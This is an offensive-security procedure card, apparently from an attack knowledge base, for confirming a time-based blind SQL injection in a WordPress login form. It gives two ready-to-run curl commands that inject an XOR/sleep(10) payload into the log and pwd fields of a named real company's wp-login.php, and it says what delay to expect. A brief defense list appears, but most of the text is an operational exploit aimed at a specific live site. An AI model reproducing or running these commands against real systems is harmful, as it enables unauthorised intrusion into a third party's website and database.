---
id: proc-capture-http-sqli-001
tags:
  - sqli
  - http-capture
  - analysis
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-capture-sleep-10]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:09.892Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Capture and Analyze Full HTTP Request for SQLi

## Summary

This procedure captures the complete HTTP POST request to the WordPress login, including encoded payloads in log and pwd, and additional fields like g-recaptcha-response, to fully demonstrate and replicate the SQLi exploit.

## Description

Full request capture reveals all parameters, headers, and timing, essential for reporting or chaining exploits. Injecting into both log and pwd maximizes confirmation, with delays proving injection in the underlying SQL query.

## Requirements

1. Verified injection from previous steps
2. Verbose logging capability (e.g., curl -v)
3. Proxy like Burp if needed for deeper analysis

## Defense

Defensive measures and detection strategies:

- Sanitize all form inputs server-side
- Implement CAPTCHA to deter automated tests
- Log full requests for forensic analysis of anomalies

## Objectives

1. Document injectable parameters comprehensively
2. Replicate delays in full context
3. Identify any protective measures like CAPTCHA

## Instructions

### Step 1: Send Full Request with Payload

**Context**: Include all typical fields and inject sleep(10) in both parameters.

**Command** ([[commands/curl-capture-sleep-10]]):
```bash
curl -v -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&wp-submit=Log+In&g-recaptcha-response=dummy" -w "%{time_total}s"
```

> Verbose output shows headers; expect 12s delay.

### Step 2: Analyze Response

**Context**: Review timing, status, and body for injection evidence.

**Command** ([[commands/curl-capture-sleep-10]] with output to file):
```bash
curl -v -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&wp-submit=Log+In&g-recaptcha-response=dummy" -o response.html -w "%{time_total}s"
```

> Save and inspect response.html for errors or redirects.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-capture-sleep-10]]

## Tools Used


## Tags

- sqli
- http-capture
- analysis

